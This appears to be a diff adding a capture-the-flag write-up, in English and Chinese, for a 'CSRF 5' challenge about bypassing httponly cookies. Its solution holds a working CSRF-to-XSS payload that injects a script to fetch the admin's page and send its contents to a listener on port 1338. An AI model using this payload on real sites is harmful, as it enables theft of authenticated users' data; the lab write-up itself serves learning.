@@ -1,0 +1,17 @@
+#CSRF 5
+#挑战简介
+This level closes the loophole that allowed you to steal cookies from JavaScript. Cookies have a special setting called httponly, and when this is set, the cookie is only accessible in HTTP headers, and not through JavaScript. 
+This is a security measure, aimed to prevent exactly the type of cookie pilfering that you have been doing. Luckily, Flask's default session cookie is set to be httponly, so you cannot steal it from JavaScript.
+
+So, now how would you get the flag with your CSRF-to-XSS shenanigans? Luckily, you don't need the cookie! Once you have JavaScript execution within the page, you can freely fetch() 
+other pages without worrying about the Same Origin Policy, since you now live in the same Origin. Use this, read the page with the flag, and win!
+
+#这道题不需要cookie，这道题放任你使用任何Javascript，因此我们可以以admin的身份打印内部的界面，以直接读出flag
+#基本格式还是那些
+<script>
+var targetURL = 'http://challenge.localhost/ephemeral?msg=' + encodeURIComponent('<script>fetch("/").then(response=>response.text()).then(data=>fetch("http://challenge.localhost:1338/?flag="+encodeURIComponent(data),
+{method:"GET",mode:"no-cors"}));<\/script>');
+window.location.href = targetURL;
+</script>
+#fetch("/")就直接可以打印出页面(有点神奇...)
+#flag会以urlencode的形式出现，记得反编回去，就此一切终结。
